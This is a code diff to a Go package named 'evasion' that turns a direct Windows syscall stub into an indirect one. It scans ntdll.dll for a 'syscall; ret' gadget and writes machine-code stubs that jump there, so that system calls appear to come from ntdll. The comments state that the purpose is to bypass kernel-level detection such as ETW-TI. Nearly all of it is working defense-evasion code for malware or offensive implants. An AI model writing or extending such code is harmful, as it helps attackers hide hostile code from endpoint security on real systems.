@@ -18,13 +18,77 @@ package evasion
 //    as a function pointer, so our stub executes directly.
 
 import (
+	"sync"
 	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-const hgStubSize = 11
+// hgStubSize is the size of an indirect syscall stub:
+//   mov r10, rcx      3
+//   mov eax, SSN      5
+//   mov rax, imm64   10  (absolute address of syscall instr inside ntdll)
+//   jmp rax           2
+//                    ──
+//                    20
+const hgStubSize = 20
+
+// hgFindSyscallInstruction scans ntdll's first executable section for a
+// "syscall; ret" (0F 05 C3) sequence and returns the address of the syscall
+// byte. When the indirect stub jumps here, the CPU executes syscall while the
+// instruction pointer is inside ntdll — the kernel sees a legitimate ntdll
+// syscall rather than one originating from our private RWX allocation.
+func hgFindSyscallInstruction() uintptr {
+	base := hgNtdllBase()
+	if base == 0 {
+		return 0
+	}
+	e_lfanew := *(*uint32)(unsafe.Pointer(base + 0x3C))
+	peBase := base + uintptr(e_lfanew)
+	numSections := *(*uint16)(unsafe.Pointer(peBase + 6))
+	optHeaderSize := *(*uint16)(unsafe.Pointer(peBase + 20))
+	sectionBase := peBase + 24 + uintptr(optHeaderSize)
+	const (
+		sectionHeaderSize  = 40
+		sectionVSizeOffset = 8
+		sectionVAOffset    = 12
+		sectionCharOffset  = 36
+		imageScnMemExecute = 0x20000000
+	)
+	for i := uint16(0); i < numSections; i++ {
+		sh := sectionBase + uintptr(i)*sectionHeaderSize
+		if *(*uint32)(unsafe.Pointer(sh+sectionCharOffset))&imageScnMemExecute == 0 {
+			continue
+		}
+		va := *(*uint32)(unsafe.Pointer(sh + sectionVAOffset))
+		vsz := *(*uint32)(unsafe.Pointer(sh + sectionVSizeOffset))
+		if va == 0 || vsz < 3 {
+			continue
+		}
+		start := base + uintptr(va)
+		for off := uintptr(0); off < uintptr(vsz)-2; off++ {
+			if *(*byte)(unsafe.Pointer(start+off)) == 0x0F &&
+				*(*byte)(unsafe.Pointer(start+off+1)) == 0x05 &&
+				*(*byte)(unsafe.Pointer(start+off+2)) == 0xC3 {
+				return start + off
+			}
+		}
+	}
+	return 0
+}
+
+var (
+	hgSyscallOnce        sync.Once
+	hgSyscallInstruction uintptr // address of "syscall" (0F 05) inside ntdll
+)
+
+func getSyscallInstruction() uintptr {
+	hgSyscallOnce.Do(func() {
+		hgSyscallInstruction = hgFindSyscallInstruction()
+	})
+	return hgSyscallInstruction
+}
 
 // hgExtractSSN reads the syscall number from a clean ntdll stub.
 func hgExtractSSN(addr uintptr) (uint16, bool) {
@@ -135,8 +199,21 @@ type HGProc struct {
 	stub uintptr
 }
 
-// NewHGProc builds a private syscall stub for the named Nt* function.
-// Returns nil if the SSN could not be resolved or allocation failed.
+// NewHGProc builds an indirect syscall stub for the named Nt* function.
+//
+// The stub sets up SSN and NT ABI registers, then jumps to a "syscall; ret"
+// instruction inside ntdll.dll so the kernel sees the syscall IP as ntdll —
+// not as our private RWX allocation.  Indirect variant bypasses kernel-level
+// callbacks that flag syscalls originating outside ntdll (e.g. ETW-TI).
+//
+// Stub layout (20 bytes):
+//   4C 8B D1              mov r10, rcx
+//   B8 lo hi 00 00        mov eax, SSN
+//   48 B8 xx..xx          mov rax, <ntdll syscall instr addr>
+//   FF E0                 jmp rax
+//
+// Falls back to a direct stub (syscall; ret) if no ntdll syscall instruction
+// is found, preserving functionality at the cost of the indirect property.
 func NewHGProc(name string) *HGProc {
 	ssn, ok := hgFindSSN(name)
 	if !ok {
@@ -147,11 +224,34 @@ func NewHGProc(name string) *HGProc {
 		return nil
 	}
 	s := (*[hgStubSize]byte)(unsafe.Pointer(addr))
-	s[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1          // mov r10, rcx
-	s[3] = 0xB8                                       // mov eax, ...
+
+	// mov r10, rcx
+	s[0] = 0x4C; s[1] = 0x8B; s[2] = 0xD1
+	// mov eax, SSN
+	s[3] = 0xB8
 	s[4] = byte(ssn); s[5] = byte(ssn >> 8); s[6] = 0x00; s[7] = 0x00
-	s[8] = 0x0F; s[9] = 0x05                          // syscall
-	s[10] = 0xC3                                       // ret
+
+	syscallIP := getSyscallInstruction()
+	if syscallIP != 0 {
+		// mov rax, <ntdll syscall addr>  (REX.W B8 + 8-byte imm)
+		s[8] = 0x48; s[9] = 0xB8
+		s[10] = byte(syscallIP)
+		s[11] = byte(syscallIP >> 8)
+		s[12] = byte(syscallIP >> 16)
+		s[13] = byte(syscallIP >> 24)
+		s[14] = byte(syscallIP >> 32)
+		s[15] = byte(syscallIP >> 40)
+		s[16] = byte(syscallIP >> 48)
+		s[17] = byte(syscallIP >> 56)
+		// jmp rax
+		s[18] = 0xFF; s[19] = 0xE0
+	} else {
+		// Fallback: direct syscall stub (IP from our RWX alloc)
+		s[8] = 0x0F; s[9] = 0x05   // syscall
+		s[10] = 0xC3                // ret
+		// bytes 11-19 are zero (nop-equivalent after ret)
+	}
+
 	return &HGProc{stub: addr}
 }
 
